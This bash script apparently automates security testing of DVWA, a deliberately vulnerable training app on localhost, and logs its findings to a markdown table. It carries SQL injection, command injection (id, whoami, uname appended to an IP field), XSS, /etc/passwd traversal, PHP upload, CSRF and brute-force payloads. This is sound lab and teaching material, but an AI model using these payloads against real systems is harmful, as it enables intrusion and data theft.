#!/usr/bin/env bash
set -euo pipefail

BASE_URL="${DVWA_BASE_URL:-http://localhost:4280}"
USER="${DVWA_USER:-admin}"
PASS="${DVWA_PASS:-password}"
COOKIE_FILE=".dvwa_cookies.txt"
DEEP_RESULTS_FILE="${DVWA_DEEP_RESULTS_FILE:-dvwa_deep_results.md}"

url_encode() { python -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))' "$1"; }
extract_token() { sed -nE "s/.*name=['\"]user_token['\"][^>]*value=['\"]([^'\"]+)['\"].*/\1/p" | head -n1; }
fetch_page() { curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" "$BASE_URL$1"; }

setup_db() {
  local token
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/setup.php" | extract_token)
  [[ -n "${token:-}" ]] || { echo "[FAIL] setup token missing"; exit 1; }
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/setup.php" \
    --data-urlencode "create_db=Create / Reset Database" \
    --data-urlencode "user_token=$token" >/dev/null
}

login() {
  local token out
  token=$(curl -fsS -c "$COOKIE_FILE" "$BASE_URL/login.php" | extract_token)
  [[ -n "${token:-}" ]] || { echo "[FAIL] login token missing"; exit 1; }
  out=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/login.php" \
    --data-urlencode "username=$USER" --data-urlencode "password=$PASS" \
    --data-urlencode "Login=Login" --data-urlencode "user_token=$token")
  grep -qi "login failed" <<<"$out" && { echo "[FAIL] login"; exit 1; }
}

set_security() {
  local level="$1" token
  token=$(fetch_page "/security.php" | extract_token)
  [[ -n "${token:-}" ]] || { echo "[FAIL] security token missing"; exit 1; }
  curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/security.php" \
    --data-urlencode "security=$level" --data-urlencode "seclev_submit=Submit" \
    --data-urlencode "user_token=$token" >/dev/null
}

init_results() {
  cat > "$DEEP_RESULTS_FILE" <<'MD'
# DVWA Deep Results (Part A)

| Vulnerability | Security | Module | Method | Payload Count | Positive Indicators | Status | Notes |
|---|---|---|---|---:|---:|---|---|
MD
}

add_row() { printf "| %s | %s | %s | %s | %s | %s | %s | %s |\n" "$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" >> "$DEEP_RESULTS_FILE"; }

test_sqli() {
  local level="$1" positives=0 total=0 p body base_count inj_count
  local payloads=("1' OR '1'='1" "1' OR 1=1#" "1' UNION SELECT user,password FROM users#" "1' AND 'a'='a")
  base_count=$(grep -o "First name:" <<<"$(fetch_page "/vulnerabilities/sqli/?id=1&Submit=Submit")" | wc -l | tr -d ' ')
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(fetch_page "/vulnerabilities/sqli/?id=$(url_encode "$p")&Submit=Submit")
    inj_count=$(grep -o "First name:" <<<"$body" | wc -l | tr -d ' ')
    [[ "$inj_count" -gt "$base_count" ]] && positives=$((positives+1))
  done
  [[ "$positives" -gt 0 ]] && add_row "SQL Injection (Classic)" "$level" "/vulnerabilities/sqli/" "GET" "$total" "$positives" "WARN (vulnerable)" "Injection increased row count" || add_row "SQL Injection (Classic)" "$level" "/vulnerabilities/sqli/" "GET" "$total" "$positives" "OK/UNCLEAR" "No row inflation"
}

test_sqli_blind() {
  local level="$1" t_base t_slow total=1 pos=0
  t_base=$(curl -fsS -o /dev/null -w "%{time_total}" -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=1&Submit=Submit")
  t_slow=$(curl -fsS -o /dev/null -w "%{time_total}" -b "$COOKIE_FILE" "$BASE_URL/vulnerabilities/sqli_blind/?id=$(url_encode "1' AND SLEEP(3)#")&Submit=Submit" || true)
  awk "BEGIN{exit !($t_slow-$t_base > 2.0)}" && pos=1 || true
  [[ "$pos" -eq 1 ]] && add_row "Blind SQL Injection" "$level" "/vulnerabilities/sqli_blind/" "GET" "$total" "$pos" "WARN (vulnerable)" "Timing delta indicates inference channel" || add_row "Blind SQL Injection" "$level" "/vulnerabilities/sqli_blind/" "GET" "$total" "$pos" "OK/UNCLEAR" "Timing inconclusive"
}

test_cmdi() {
  local level="$1" total=0 pos=0 p body
  local payloads=("127.0.0.1;id" "127.0.0.1&&whoami" "127.0.0.1|uname -a")
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/exec/" --data-urlencode "ip=$p" --data-urlencode "Submit=Submit")
    grep -qiE "uid=|gid=|linux|www-data|root" <<<"$body" && pos=$((pos+1))
  done
  [[ "$pos" -gt 0 ]] && add_row "Command Injection" "$level" "/vulnerabilities/exec/" "POST" "$total" "$pos" "WARN (vulnerable)" "Injected command markers found" || add_row "Command Injection" "$level" "/vulnerabilities/exec/" "POST" "$total" "$pos" "OK/UNCLEAR" "No command markers"
}

test_xss_r() {
  local level="$1" total=0 pos=0 p body
  local payloads=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg/onload=alert(1)>")
  for p in "${payloads[@]}"; do
    total=$((total+1))
    body=$(fetch_page "/vulnerabilities/xss_r/?name=$(url_encode "$p")")
    grep -Fq "$p" <<<"$body" && pos=$((pos+1))
  done
  [[ "$pos" -gt 0 ]] && add_row "Reflected XSS" "$level" "/vulnerabilities/xss_r/" "GET" "$total" "$pos" "WARN (vulnerable)" "Raw payload reflected" || add_row "Reflected XSS" "$level" "/vulnerabilities/xss_r/" "GET" "$total" "$pos" "OK/UNCLEAR" "Raw reflection not observed"
}

test_xss_s() {
  local level="$1" total=3 pos=0 i marker body
  for i in 1 2 3; do
    marker="DVWA_STORED_${level}_${i}_$(date +%s)"
    curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/xss_s/" \
      --data-urlencode "txtName=<script>${marker}</script>" --data-urlencode "mtxMessage=stored" --data-urlencode "btnSign=Sign Guestbook" >/dev/null
    body=$(fetch_page "/vulnerabilities/xss_s/")
    grep -Fq "<script>${marker}</script>" <<<"$body" && pos=$((pos+1))
  done
  [[ "$pos" -gt 0 ]] && add_row "Stored XSS" "$level" "/vulnerabilities/xss_s/" "POST" "$total" "$pos" "WARN (vulnerable)" "Script markers persisted" || add_row "Stored XSS" "$level" "/vulnerabilities/xss_s/" "POST" "$total" "$pos" "OK/UNCLEAR" "No persisted raw marker"
}

test_csrf() {
  local level="$1" total=3 pos=0 pw body
  for pw in password pass123 Password123!; do
    body=$(fetch_page "/vulnerabilities/csrf/?password_new=$(url_encode "$pw")&password_conf=$(url_encode "$pw")&Change=Change")
    total=$((total+1)); grep -q "Password Changed" <<<"$body" && pos=$((pos+1))
  done
  fetch_page "/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change" >/dev/null || true
  [[ "$pos" -gt 0 ]] && add_row "CSRF" "$level" "/vulnerabilities/csrf/" "GET" "$total" "$pos" "WARN (vulnerable)" "State change accepted without anti-CSRF proof" || add_row "CSRF" "$level" "/vulnerabilities/csrf/" "GET" "$total" "$pos" "OK/UNCLEAR" "No state change evidence"
}

test_lfi() {
  local level="$1" total=0 pos=0 p body
  local payloads=("../../../../../../etc/passwd" "../../../../../../etc/hosts" "../../../../../../proc/self/environ")
  for p in "${payloads[@]}"; do
    total=$((total+1)); body=$(fetch_page "/vulnerabilities/fi/?page=$(url_encode "$p")")
    grep -qiE "root:x:|localhost|PATH=" <<<"$body" && pos=$((pos+1))
  done
  [[ "$pos" -gt 0 ]] && add_row "File Inclusion (LFI/RFI)" "$level" "/vulnerabilities/fi/" "GET" "$total" "$pos" "WARN (vulnerable)" "System file markers present" || add_row "File Inclusion (LFI/RFI)" "$level" "/vulnerabilities/fi/" "GET" "$total" "$pos" "OK/UNCLEAR" "No marker found"
}

test_upload() {
  local level="$1" total=0 pos=0 ext tmp file body check
  for ext in php phtml phar; do
    total=$((total+1)); tmp=$(mktemp); file="dvwa_deep_${ext}_$(date +%s).${ext}"
    printf '<?php echo "UP_%s"; ?>' "$ext" > "$tmp"
    body=$(curl -fsS -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/upload/" -F "uploaded=@$tmp;filename=$file" -F "Upload=Upload")
    rm -f "$tmp"
    check=$(curl -fsS "$BASE_URL/hackable/uploads/$file" || true)
    (grep -qi "succesfully uploaded" <<<"$body" || grep -q "UP_${ext}" <<<"$check") && pos=$((pos+1))
  done
  [[ "$pos" -gt 0 ]] && add_row "Unrestricted File Upload" "$level" "/vulnerabilities/upload/" "POST multipart" "$total" "$pos" "WARN (vulnerable)" "Executable extension accepted/reachable" || add_row "Unrestricted File Upload" "$level" "/vulnerabilities/upload/" "POST multipart" "$total" "$pos" "OK/UNCLEAR" "Executable upload blocked"
}

test_brute() {
  local level="$1" total=20 pos=0 i out blocked=0
  for i in $(seq 1 20); do
    out=$(fetch_page "/vulnerabilities/brute/?username=admin&password=wrong${i}&Login=Login")
    grep -qiE "too many|locked|rate" <<<"$out" && blocked=1
  done
  [[ "$blocked" -eq 0 ]] && pos=1 || true
  [[ "$pos" -eq 1 ]] && add_row "Weak Brute-Force Protection" "$level" "/vulnerabilities/brute/" "GET" "$total" "$pos" "WARN (vulnerable)" "No lockout/rate-limit indicators" || add_row "Weak Brute-Force Protection" "$level" "/vulnerabilities/brute/" "GET" "$total" "$pos" "OK/UNCLEAR" "Lockout/rate-limit indicator present"
}

test_weak_id() {
  local level="$1" total=15 pos=0 i h v vals=() mono=1
  for i in $(seq 1 15); do
    h=$(curl -fsSI -b "$COOKIE_FILE" -c "$COOKIE_FILE" -X POST "$BASE_URL/vulnerabilities/weak_id/")
    v=$(grep -i '^set-cookie: dvwaSession=' <<<"$h" | sed -E 's/.*dvwaSession=([^;]+).*/\1/I' | tail -n1)
    [[ -n "${v:-}" ]] && vals+=("$v")
  done
  if [[ "${#vals[@]}" -lt 5 ]]; then
    mono=0
  else
    for i in $(seq 1 $((${#vals[@]}-1))); do
      [[ "${vals[$((i-1))]}" =~ ^[0-9]+$ && "${vals[$i]}" =~ ^[0-9]+$ ]] || { mono=0; break; }
      [[ $((vals[i])) -eq $((vals[i-1]+1)) ]] || { mono=0; break; }
    done
  fi
  [[ "$mono" -eq 1 ]] && pos=1 || true
  [[ "$pos" -eq 1 ]] && add_row "Weak Session ID" "$level" "/vulnerabilities/weak_id/" "POST" "$total" "$pos" "WARN (vulnerable)" "Monotonic numeric session IDs" || add_row "Weak Session ID" "$level" "/vulnerabilities/weak_id/" "POST" "$total" "$pos" "OK/UNCLEAR" "No strict monotonic sequence"
}

run_suite_for_level() {
  local level="$1"
  set_security "$level"
  test_sqli "$level"
  test_sqli_blind "$level"
  test_cmdi "$level"
  test_xss_r "$level"
  test_xss_s "$level"
  test_csrf "$level"
  test_lfi "$level"
  test_upload "$level"
  test_brute "$level"
  test_weak_id "$level"
}

full() {
  init_results
  setup_db
  login
  run_suite_for_level low
  run_suite_for_level medium
  echo "[OK] deep run complete -> $DEEP_RESULTS_FILE"
}

case "${1:-}" in
  full) full ;;
  *) echo "Usage: $0 {full}"; exit 1 ;;
esac
